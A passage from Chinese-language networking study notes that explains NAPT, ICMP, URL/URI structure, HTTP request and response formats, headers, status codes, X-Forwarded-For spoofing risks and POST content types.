地址，你就要 N 个公有 IP 地址？这怎么就缓解了 IPv4 地址耗尽的问题？这不瞎扯吗？</strong></p><p>确实是，普通的 NAT 转换没什么意义。由于绝大多数的网络应用都是使用传输层协议 TCP 或 UDP 来传输数据的。因此，可以把 IP 地址 + 端口号一起进行转换。这样，就用一个全球 IP 地址就可以了，这种转换技术就叫网络地址与端口转换NAPT。很抽象？来，看下面的图解就能瞬间明白了</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302214313.png" alt="image-20220930221438973" style="zoom:50%;" /><p>图中有两个客户端 192.168.1.10 和 192.168.1.11 同时与服务器183.232.231.172进行通信，并且这两个客户端的本地端口都是 1025。</p><p>此时，两个私有 IP 地址都转换 IP 地址为公有地址 120.229.175.121，但是以不同的端口号作为区分。于是，生成一个 NAPT 路由器的转换表，就可以正确地转换地址跟端口的组合，令客户端 A、B 能同时与服务器之间进行通信。这种转换表在 NAT 路由器上自动生成。例如，在 TCP 的情况下，建立 TCP 连接首次握手时的 SYN 包一经发出，就会生成这个表。而后又随着收到关闭连接时发出FIN 包的确认应答从表中被删除。</p><h2 id="ICMP-互联网控制报文协议"><a href="#ICMP-互联网控制报文协议" class="headerlink" title="ICMP 互联网控制报文协议"></a>ICMP 互联网控制报文协议</h2><p>ICMP 全称是 Internet Control Message Protocol，也就是互联网控制报文协议。里面有个关键词 —— 控制，如何控制的呢？</p><p>网络包在复杂的网络传输环境里，常常会遇到各种问题。当遇到问题的时候，总不能死个不明不白，没头没脑的作风不是计算机网络的风格。所以需要传出消息，报告遇到了什么问题，这样才可以调整传输策略，以此来控制整个局面。</p><h3 id="ICMP-功能都有啥？"><a href="#ICMP-功能都有啥？" class="headerlink" title="ICMP 功能都有啥？"></a>ICMP 功能都有啥？</h3><p>ICMP 主要的功能包括：确认 IP 包是否成功送达目标地址、报告发送过程中 IP 包被废弃的原因和改善网络设置等。在 IP 通信中如果某个 IP 包因为某种原因未能达到目标地址，那么这个具体的原因将由 ICMP 负责通知。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302215666.png" alt="image-20220930221509410" style="zoom:50%;" /><p>如上图例子，主机 A 向主机 B 发送了数据包，由于某种原因，途中的路由器 2 未能发现主机 B 的存在，这时，路由器 2 就会向主机 A 发送一个 ICMP 目标不可达数据包，说明发往主机 B 的包未能成功。</p><p>ICMP 的这种通知消息会使用 IP 进行发送 。</p><p>因此，从路由器 2 返回的 ICMP 包会按照往常的路由控制先经过路由器 1 再转发给主机 A 。收到该 ICMP 包的主机 A 则分解 ICMP 的首部和数据域以后得知具体发生问题的原因。</p><h3 id="ICMP-大致可以分为两大类："><a href="#ICMP-大致可以分为两大类：" class="headerlink" title="ICMP 大致可以分为两大类："></a>ICMP 大致可以分为两大类：</h3><ul><li>一类是用于诊断的查询消息，也就是「查询报文类型」</li><li>另一类是通知出错原因的错误消息，也就是「差错报文类型」</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010050020.png" alt="image-20220930221913629" style="zoom:50%;" /><h1 id="统一资源定位符（URL）和统一资源标志符-URI"><a href="#统一资源定位符（URL）和统一资源标志符-URI" class="headerlink" title="统一资源定位符（URL）和统一资源标志符(URI)"></a>统一资源定位符（URL）和统一资源标志符(URI)</h1><h2 id="统一资源定位符（URL）"><a href="#统一资源定位符（URL）" class="headerlink" title="统一资源定位符（URL）"></a>统一资源定位符（URL）</h2><p>URL 遵守一种标准的语法，它由协议、主机名、域名、端口、路径、以及文件名这六个部分构成，其中端口可以省略。具体语法规则如下，例如：</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages">https://en.wikipedia.org:443/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages</a></p></blockquote><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">protocol:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line">[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段ID]</span><br><span class="line">protocol：指定使用的传输协议，最常用的是通过 HTTP/HTTPS 协议来定位网络资源。</span><br><span class="line">          mailto: 用户打开邮箱的客户端</span><br><span class="line">          ftp: 用来做文件的转换</span><br><span class="line">          file: 用来获取文件</span><br><span class="line">user:password 需要认证后才能访问时的账号密码。</span><br><span class="line">host：表示合法的因特网主机域名或者IP地址。</span><br><span class="line">port：用于表示在传输层上交换信息的进程端口号，标明了获取服务器资源的入口,http协议默认端口号为80，不同的协议默认端口号不同。</span><br><span class="line">path：指定请求服务器上资源的路径。</span><br><span class="line">?query：可选，用于给动态网页传递参数，可以有多个参数，用&quot;&amp;&quot;符号隔开，每个参数的键值之间用&quot;=&quot;隔开。</span><br><span class="line">#fragment：信息片断字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。也就是常指的锚点，定位到网页的某一位置。</span><br></pre></td></tr></table></figure><h2 id="统一资源标志符-URI"><a href="#统一资源标志符-URI" class="headerlink" title="统一资源标志符(URI)"></a>统一资源标志符(URI)</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302224877.png" alt="image-20220930222414559"></p><p>URI： Universal Resource Identifier 统一资源标志符，用来标识抽象或物理资源的一个紧凑字符串。</p><p>HTTP是基于客户端&#x2F;服务端（C&#x2F;S）的架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求&#x2F;响应协议。</p><p>HTTP使用统一资源标识符（URI）来传输数据和建立连接。</p><p>URI和URL的区别：URL是URI的一个子集</p><p>URN： Universal Resource Name 统一资源名称，通过特定命名空间中的唯一名称或ID来标识资源。</p><p>URI可被视为定位符（URL），名称（URN）或两者兼备。统一资源名（URN）如同一个人的名称，而统一资源定位符（URL）代表一个人的住址。换言之，URN定义某事物的身份，而URL提供查找该事物的方法。</p><h1 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h1><h2 id="HTTP是什么"><a href="#HTTP是什么" class="headerlink" title="HTTP是什么"></a>HTTP是什么</h2><p>HTTP 是超文本传输协议，也就是HyperText Transfer Protocol。是一种用于分布式、协作式和超媒体信息系统的应用层协议。是一个基于请求与响应，无状态的，应用层的协议，常基于 TCP&#x2F;IP 协议传输数据，互联网上应用最为广泛的一种网络协议,所有的互联网文件都必须遵守这个标准。</p><p>HTTP的名字「超文本协议传输」，它可以拆成三个部分：</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>HTTP 是一个用在计算机世界里的协议。它使用计算机能够理解的语言确立了一种计算机之间交流通信的规范（两个以上的参与者），以及相关的各种控制和错误处理方式（行为约定和规范）。</p><h3 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h3><p>就是把一堆东西从 A 点搬到 B 点，或者从 B 点 搬到 A 点。HTTP 协议是一个双向协议。HTTP 是一个在计算机世界里专门用来在两点之间传输数据的约定和规范。我们在上网冲浪时，浏览器是请求方 A ，百度网站就是应答方 B。双方约定用 HTTP协议来通信，于是浏览器把请求数据发送给网站，网站再把一些数据返回给浏览器，最后由浏览器渲染在屏幕，就可以看到图片、视频了。</p><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>HTTP 传输的内容是「超文本」「文本」，在互联网早期的时候只是简单的字符文字，但现在「文本」。的涵义已经可以扩展为图片、视频、压缩包等，在 HTTP 眼里这些都算做「文本」。「超文本」，它就是超越了普通文本的文本，它是文字、图片、视频等的混合体，最关键有超链接，能从一个超文本跳转到另外一个超文本。HTML 就是最常见的超文本了，它本身只是纯文字文件，但内部用很多标签定义了图片、视频等的链接，在经过浏览器的解释，呈现给我们的就是一个文字、有画面的网页了。</p><h2 id="HTTP客户端请求消息"><a href="#HTTP客户端请求消息" class="headerlink" title="HTTP客户端请求消息"></a>HTTP客户端请求消息</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010050021.png" alt="image-20220930222926720" style="zoom:50%;" /><p>HTTP请求报文：web客户端向服务器发送的请求</p><p>HTTP请求由四个部分组成：</p><blockquote><ul><li>请求行</li><li>请求头部</li><li>空行</li><li>请求正文</li></ul></blockquote><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method Request-URI HTTP-Version CRLF</span><br><span class="line">Method：表示请求方法;</span><br><span class="line">Request-URI：是一个统一资源标识符;</span><br><span class="line">HTTP-Version：表示请求的HTTP协议版本;</span><br><span class="line">CRLF：表示回车和换行\r\n表示回车换行    CR(Carriage Return) 代表回车，对应字符&#x27;\r&#x27;；LF(Line Feed) 代表换行，对应字符&#x27;\n&#x27;</span><br><span class="line">除了作为结尾的CRLF外，不允许出现单独的CR或LF字符</span><br></pre></td></tr></table></figure><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。 </span><br><span class="line">HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 </span><br><span class="line">CONNECT 方法。</span><br><span class="line"></span><br><span class="line">GET 请求获取Request-URI所标识的资源</span><br><span class="line">POST 在Request-URI所标识的资源后附加新的数据</span><br><span class="line">HEAD 请求获取由Request-URI所标识的资源的响应消息报头</span><br><span class="line">PUT 请求服务器存储一个资源，并用Request-URI作为其标识</span><br><span class="line">DELETE 请求服务器删除Request-URI所标识的资源</span><br><span class="line">TRACE 请求服务器回送收到的请求信息，主要用于测试或诊断</span><br><span class="line">OPTIONS 请求查询服务器的性能，或者查询与资源相关的选项和需求</span><br><span class="line">CONNECT 保留将来使用，HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</span><br><span class="line">PATCH 用于将局部修改应用到资源。（由 RFC 5789 指定的方法）</span><br></pre></td></tr></table></figure><h3 id="请求头部字段"><a href="#请求头部字段" class="headerlink" title="请求头部字段"></a>请求头部字段</h3><p>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><blockquote><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">http_header有哪些头部:</a></li><li><a href="http://tools.jb51.net/table/http_content_type">content-type头部有哪些值：</a></li></ul></blockquote><p>请求头部字段：（Request Header Fields）允许客户端传递关于自身的信息和希望的响应形式。</p><p>在HTTP&#x2F;1.1协议中，所有的请求头，除Host外，都是可选的。注意useragent，accept，origin等字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Header：Header_Value CRLF //注意冒号后面和头部值之间有一个空格</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302231325.png" alt="image-20220930223149959" style="zoom:50%;" /><h4 id="Host："><a href="#Host：" class="headerlink" title="Host："></a>Host：</h4><blockquote><p>客户端发送请求时，用来指定服务器的域名。有了 Host 字段，就可以将请求发往「同一台」服务器上的不同网站。</p><p><code>Host: www.A.com</code></p></blockquote><h4 id="Content-Length："><a href="#Content-Length：" class="headerlink" title="Content-Length："></a>Content-Length：</h4><blockquote><p>服务器在返回数据时，会有 Content-Length 字段，表明本次回应的数据长度。</p><p><code>Content-Length: 1000</code> 如上面则是告诉浏览器，本次服务器回应的数据长度是 1000 个字节，如果还有更多的数据在后面，那就 属于下一个回应了。</p></blockquote><h4 id="Connection：Connection"><a href="#Connection：Connection" class="headerlink" title="Connection：Connection"></a>Connection：Connection</h4><blockquote><p>字段最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP&#x2F;1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定Connection 首部字段的值为 Keep-Alive 。一个可以复用的 TCP 连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><p><code>Connection: keep-alive</code></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302234096.png" alt="image-20220930223406787" style="zoom: 33%;" /><h4 id="Content-Type："><a href="#Content-Type：" class="headerlink" title="Content-Type："></a>Content-Type：</h4><blockquote><p>Content-Type 字段用于服务器回应时，告诉客户端，本次数据是什么格式。用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf-8 </span><br><span class="line">//上面的类型表明，发送的是网页，而且编码是UTF-8。</span><br></pre></td></tr></table></figure><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept :"></a>Accept :</h4><blockquote><p>客户端请求的时候，可以使用 Accept 字段声明自己可以接受哪些数据格式。指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept: \*/\* </span><br><span class="line">//上面代码中，客户端声明自己可以接受任何格式的数据。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302236496.png" alt="image-20220930223617469" style="zoom:50%;" /><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding:"></a>Content-Encoding:</h4><blockquote><p>Content-Encoding 字段说明数据的压缩方法。表示服务器返回的数据使用了什么压缩格式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip </span><br><span class="line">//上面表示服务器返回的数据采用了 gzip 方式压缩，告知客户端需要用此方式解压。</span><br></pre></td></tr></table></figure><h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding:"></a>Accept-Encoding:</h4><p>客户端在请求时，用 Accept-Encoding 字段说明自己可以接受哪些压缩方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302238469.png" alt="image-20220930223747919" style="zoom:50%;" /><h4 id="Connection："><a href="#Connection：" class="headerlink" title="Connection："></a>Connection：</h4><p>用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</p><h4 id="Cookie："><a href="#Cookie：" class="headerlink" title="Cookie："></a>Cookie：</h4><p>浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p><h4 id="Referer-："><a href="#Referer-：" class="headerlink" title="Referer ："></a>Referer ：</h4><p>表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 <code>/icconcept/index.jsp</code> 中 点 击 一 个 链 接 到 网 页<code>/icwork/search</code> ， 在 向 服 务 器 发 送 的 <code>GET/icwork/search</code> 中 的 请 求 中 ， Referer 是<code>http://hostname:8080/icconcept/index.jsp</code>。这个属性可以用来跟踪 Web 请求是从什么网站来的。</p><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><blockquote><p>表示请求头结束，请求正文（请求体）开始</p></blockquote><h3 id="请求正文"><a href="#请求正文" class="headerlink" title="请求正文"></a>请求正文</h3><ul><li>GET方法：提交数据时，数据参数会作为URL的一部分，放在文件路径后面发送给服务器，被称为查询字符串</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hetianlab.com?username=12345%40qq.com&amp;password=2f7402f......a592b&amp;validateCode=&amp;rtnJson=true</span><br></pre></td></tr></table></figure><ul><li>POST方法：发送的数据在请求体中</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=12345%40qq.com\&amp;password=2f7402f......a592b\&amp;validateCode=\&amp;rtnJson=true</span><br></pre></td></tr></table></figure><ul><li>URL编码</li></ul><p>注意%40是URI的编码方式，在burpsuite之中可以用CTRL+SHIFT+U对之进行解码，CTRL+U进行URL编码</p><p>合天网安登录界面POST的包</p><p>百分号编码又叫做URL编码，是一种编码机制，只要用于URI（包含URL和URN）编码中。</p><p>URL中那些字符需要编码，又为什么进行编码?</p><p><strong>为什么会需要编码？</strong></p><p>那是因为这样东西不适合传输。原因可能有很多种：大小过大，包含隐私数据。对于URL而言，之所以进行编码是因为URL中有一些字符会引起歧义。</p><p><strong>例如：</strong>URL参数字符串中使用键值对这样的形式来传参，键值对之间使用了 &amp; 符号分隔。</p><p>如果value字符串中包含了 @ 或 &amp; 等字符，那么一定会造成接收URL的服务器解析错误，因此就需要对造成歧义的 @ 和 &amp; 进行转义，对其进行编码。</p><p>还有，如果URL的字符集使用的ASCII 码，不是 Unicode，这就意味着不可以在 URL 中包含任何的非 ASCII 码，例如：中文，否则客户端浏览器和服务器设定的字符集不同的情况下，输入的中文就会出现乱码。</p><p>百分号编码（URL编码）会对URL不允许出现的字符或者其他特殊情况的允许的字符进行编码，对于被编码的字符，最终会转为百分号 % 开头，后面跟这昂个十六进制数字的形式。例如：空格（SP）是不允许的字符，在ACSII码中对应的的二进制值是 00100000 ，最终转换为 %20。</p><p><strong><u>URL编码的原则就是使用安全的字符（没有特殊用途或者特殊意义的可打印字符）去掉那些不安全的字符，以保证内容的正常显示。</u></strong></p><h2 id="HTTP服务端响应消息"><a href="#HTTP服务端响应消息" class="headerlink" title="HTTP服务端响应消息"></a>HTTP服务端响应消息</h2><p>HTTP响应报文：在接收和解释请求消息后，服务器返回一个HTTP响应消息。HTTP响应也由四个部分组成，分别是：</p><blockquote><ul><li>状态行</li><li>消息报头(响应报头字段）</li><li>空行</li><li>响应正文</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302343948.png" alt="image-20220930234347580" style="zoom:50%;" /><h3 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP-Version Status-Code Reason-Phrase CRLF</span><br><span class="line">HTTP-Version：表示服务器HTTP协议的版本；</span><br><span class="line">Status-Code：表示服务器发回的响应状态代码；</span><br><span class="line">Reason-Phrase：表示状态代码的文本描述。</span><br></pre></td></tr></table></figure><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><blockquote><ul><li><a href="https://www.runoob.com/http/http-status-codes.html">https://www.runoob.com/http/http-status-codes.html</a></li><li><a href="http://tools.jb51.net/table/http_status_code">http://tools.jb51.net/table/http_status_code</a></li></ul></blockquote><p>五大类HTTP状态码</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302344363.png" alt="image-20220930234436057" style="zoom:50%;" /><blockquote><p>1xx  类状态码属于提示信息，是协议处理中的一种中间状态，实际用到的比较少。<strong>表示信息，请求收到，继续处理</strong></p><p>2xx  类状态码表示服务器成功处理了客户端的请求，也是我们最愿意看到的状态。<strong>表示成功，行为被成功地接受、理解和采纳</strong></p><blockquote><ul><li>「200 OK」是最常见的成功状态码，表示一切正常。如果是非 HEAD  请求，服务器返回的响应头都会有 body 数据。</li><li>「204 No Content」也是常见的成功状态码，与 200 OK 基本相同，但响应头没有body 数据。</li><li>「206 Partial Content」是应用于 HTTP 分块下载或断电续传，表示响应返回的body 数据并不是资源的全部，而是其中的一部分，也是服务器处理成功的状态。</li></ul></blockquote><p>3xx  类状态码表示客户端请求的资源发送了变动，需要客户端用新的 URL 重新发送请求获取资源，也就是重定向。<strong>表示重定向，为了完成请求，必须进一步执行的动作</strong></p><blockquote><ul><li>「301 Moved Permanently」表示永久重定向，说明请求的资源已经不存在了，需改用新的 URL 再次访问。</li><li>「302 Moved Permanently」表示临时重定向，说明请求的资源还在，但暂时需要用另一个 URL 来访问。</li><li>301 和 302 都会在响应头里使用字段 Location ，指明后续要跳转的 URL，浏览器会自动重定向新的 URL。</li><li>「304 Not Modified」不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，用于缓存控制。</li></ul></blockquote><p>4xx  类状态码表示客户端发送的报文有误，服务器无法处理，也就是错误码的含义。</p><blockquote><ul><li>「400 Bad Request」表示客户端请求的报文有错误，但只是个笼统的错误。</li><li>「403 Forbidden」表示服务器禁止访问资源，并不是客户端的请求出错。</li><li>「404 Not Found」表示请求的资源在服务器上不存在或未找到，所以无法提供给客户端。</li></ul></blockquote><p>5xx  类状态码表示客户端请求报文正确，但是服务器处理时内部发生了错误，属于服务器端的错误码。</p><blockquote><ul><li>「500 Internal Server Error」与 400 类似，是个笼统通用的错误码，服务器发生了什么错误，我们并不知道。</li><li>「501 Not Implemented」表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思。</li><li>「502 Bad Gateway」通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误。</li><li>「503 Service Unavailable」表示服务器当前很忙，暂时无法响应服务器，类似“网络服务正忙，请稍后重试”的意思。</li></ul></blockquote></blockquote><h4 id="几个比较重要的状态码："><a href="#几个比较重要的状态码：" class="headerlink" title="几个比较重要的状态码："></a><strong>几个比较重要的状态码：</strong></h4><blockquote><ul><li>200：存在文件</li><li>403：存在文件夹</li><li>3xx：均可能存在</li><li>404：不存在文件及文件夹</li><li>500：均可能存在</li></ul></blockquote><h3 id="响应头部字段"><a href="#响应头部字段" class="headerlink" title="响应头部字段"></a>响应头部字段</h3><p>响应头部字段（Response Header Fields）：</p><p>响应报头<strong>允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对 Request-URI 所标识的资源进行下一步访问的信息</strong>。</p><p>常见头部：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302345624.png" alt="image-20220930234527221" style="zoom: 33%;" /><p>注意：</p><blockquote><ul><li>这个表格里面的data应该改为date，是日期</li><li>setcookie字段：在用户第一次访问网站后的响应包中，服务器会在setcookie字段返回给客户一个cookie，以此来表示此后每一次访问用户的身份。</li></ul></blockquote><h4 id="X-Real-IP-与-X-Forwarded-For-与-Remote-Address"><a href="#X-Real-IP-与-X-Forwarded-For-与-Remote-Address" class="headerlink" title="X-Real-IP 与 X-Forwarded-For 与 Remote Address"></a>X-Real-IP 与 X-Forwarded-For 与 Remote Address</h4><blockquote><blockquote><ul><li><a href="https://blog.csdn.net/weiyuefei/article/details/78687545">X-Forwarded-For 和 X-Real-IP 的区别？</a></li><li><a href="https://blog.mazey.net/1575.html">X-Real-IP 与 X-Forwarded-For</a></li></ul></blockquote><blockquote><ul><li><p>X-Real-IP：从字面看 X-Real-IP 代表的是客户端请求真实的 IP 地址，这个参数没有相关标准规范，如果是直接访问的请求，可能是客户端真实的 IP 地址，但是中间若经过了层层的代理，就是<strong>最后一层代理的 IP 地址</strong>。</p></li><li><p>X-Forwarded-For 记录着从客户端发起请求后访问过的每一个 IP 地址，当然第一个是发起请求的客户端本身的地址，各 IP 地址间由“英文逗号+空格”(<code>,</code>)分隔。</p><p>X-Forwarded-For 请求头格式：</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">X-Forwarded-For</span>: <span class="string">client, proxy1, proxy2</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><p><strong>注意到xff是可以伪造IP的</strong>，因此，一般来说，我们要获得客户端地址，直接从 X-Forwarded-For 拿到第一个 IP 地址即可。一般代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ips</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-Forwarded-For&quot;</span>);</span><br><span class="line"><span class="comment">// 从ips中切割出client Ip 略</span></span><br></pre></td></tr></table></figure><p>X-Forwarded-For 作为 HTTP 请求的扩展头，在请求的过程中可以被直接的进行修改。正常情况下，我们所获得的 ip 第一部分应该是客户端 IP，但是如果客户端对 X-Forwarded-For 进行了修改，我们仍旧采用以上方法获得客户端 IP，那么客户端 IP 将会是被伪造过的。</p><p>可以看到，如果只是简单进行获取，可能造成许多安全问题，尤其对于对 IP 具有较高要求的场景，例如<strong>投票系统</strong>等,可以通过换IP来刷票</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/345273687">X-Forwarded-For 客户端 IP 伪造过程及防范</a></p><p><a href="https://www.jianshu.com/p/98c08956183d">WEB安全-伪造X-Forwarded-For绕过服务器IP地址过滤</a></p></blockquote></blockquote><blockquote><p><strong>Remote Address——与服务器相连的机器的IP</strong></p><p>REMOTE_ADDR代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值</p><p>当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP</p><p>Remote Address代表的是当前HTTP请求的远程地址，即HTTP请求的源地址。HTTP协议在三次握手时使用的就是这个Remote Address地址，在发送响应报文时也是使用这个Remote Address地址。因此，如果请求者伪造Remote Address地址，他将无法收到HTTP的响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。</p><p>如果Http请求经过代理服务器转发，则这种情况，用户的真实ip会丢失，所以才有了<code>X-Forwarded-For</code>的方式。</p><blockquote><p><a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP 请求头中的 Remote_Addr，X-Forwarded-For，X-Real-IP</a></p><p><a href="http://blog.nsfocus.net/user-ip/">【干货分享】<strong>获取用户IP的正确姿势</strong></a></p></blockquote></blockquote><h3 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h3><blockquote><p>表示响应头结束，响应正文（响应体）开始</p></blockquote><h3 id="响应正文"><a href="#响应正文" class="headerlink" title="响应正文"></a>响应正文</h3><p>服务器返回的资源内容：<strong>关于这个内容是表示什么意思，还需要结合content-type来具体分析</strong>,下面会讲到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;success&quot;,&quot;message&quot;\:null&#125;</span><br></pre></td></tr></table></figure><h2 id="HTTP请求方法理解"><a href="#HTTP请求方法理解" class="headerlink" title="HTTP请求方法理解"></a>HTTP请求方法理解</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>Get 方法的含义是请求从服务器获取资源，这个资源可以是静态的文本、页面、图片视频等。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302346940.png" alt="image-20220930234641598" style="zoom:50%;" /><p>不包含请求主体</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302346029.png" alt="image-20220930234650693" style="zoom:50%;" /><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>POST：向 Request-URI 所标识的资源提交数据，数据就放在请求正文中用于向指定资源发送数据，指定的资源会对数据进行处理，然后将处理结果返回给客户端，一般用于表单提交、文件上传</p><h4 id="POST提交数据的几种-Content-Type-："><a href="#POST提交数据的几种-Content-Type-：" class="headerlink" title="POST提交数据的几种 Content-Type ："></a>POST提交数据的几种 Content-Type ：</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302348085.png" alt="image-20220930234812777" style="zoom:50%;" /><blockquote><p><a href="https://blog.csdn.net/u014209205/article/details/81147783">三种常见的http content-type详解</a></p><p>application&#x2F;x-www-form-urlencoded ：最常见的 POST 提交数据方式，浏览器支持的原生 form 表单<br>multipart&#x2F;form-data ：这种方式一般用来上传文件。<br>application&#x2F;json ：在响应头中很常见，在请求头中用来告诉服务端消息主体是序列化后的 json 字符串。</p></blockquote><p>下面具体谈谈这三种提交方式</p><h4 id="application-x-www-form-urlencoded"><a href="#application-x-www-form-urlencoded" class="headerlink" title="application/x-www-form-urlencoded"></a><code>application/x-www-form-urlencoded</code></h4><blockquote><p>最常见的POST提交数据方式，浏览器支持的原生form表单提交方式</p><p>该方式会将表单内的数据转换为键值对，比如,name&#x3D;java&amp;age &#x3D; 23</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302348189.png" alt="image-20220930234824929" style="zoom: 50%;" /></blockquote><h4 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a><code>multipart/form-data</code></h4><blockquote><p>这种方式一般用来上传文件，偶尔上传表单数据键值对，没错这种方式也可以像<code>application/x-www-form-urlencoded</code>那样上传表单数据！</p><p>http请求中的multipart&#x2F;form-data,它会<strong>将表单的数据处理为一条消息</strong>，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。当上传的字段是文件时，会有Content-Type来表名文件类型；content-disposition，用来说明字段的一些信息；<br>由于有boundary隔离，所以multipart&#x2F;form-data既可以上传文件，也可以上传键值对，它采用了键值对的方式，所以可以上传多个文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302348923.png" alt="image-20220930234840576" style="zoom:50%;" /><h5 id="上图内容细节解释："><a href="#上图内容细节解释：" class="headerlink" title="上图内容细节解释："></a><strong>上图内容细节解释：</strong></h5><blockquote><ol><li><p>客户端生成一个 boundary ，其值是一个很长的字符串， 用于分割不同的字段，为了避免与正 文内容重复，boundary 很长很复杂；</p></li><li><p>然后 Content-Type 里指明了数据是以 mutipart&#x2F;form-data 来编码，本次请求的 boundary 